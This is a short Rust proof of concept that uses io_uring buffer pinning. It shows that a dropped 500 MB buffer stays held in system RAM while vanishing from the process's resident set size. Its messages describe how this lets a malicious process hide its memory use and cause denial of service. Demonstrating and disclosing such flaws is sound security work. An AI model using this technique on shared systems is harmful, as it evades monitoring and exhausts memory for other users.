// Demonstrates desync between system RAM and a process' resident set size (RSS)
// Trigger by dropping a pinned memory page


use crate::monitor;
use io_uring::IoUring;
use std::io;

pub fn demo() {
    monitor::log_memory_stats("Pre-buffer allocation");
    
    let mut ring = IoUring::new(8).unwrap();
    // 500 MB
    let size = 1024 * 1024 * 500;
    let (_, v) = monitor::prepare_ghost_buffer(&mut ring, size, None);
    println!("Allocated 500MB buffer");

    monitor::log_memory_stats("Pre-ghost (mapped)");
    println!("Pinning buffer in io_uring");
    
    println!("Dropping/unmapping buffer");
    drop(v);

    monitor::log_memory_stats("Post-ghost (unmapped)");
  
    println!("After allocating the buffer, the available RAM should decrease by 500 MB");
    println!("When dropping the buffer, we see the process unmaps the RAM but the system RAM doesn't increase");
    println!("Allows a malicious process to take up RAM without being associated with the RAM");
    println!("If duplicated this allows for potential DoS opportunities");

    println!("\n Press enter to exit and release RAM");

    let mut _input = String::new();
    io::stdin().read_line(&mut _input).ok();
}
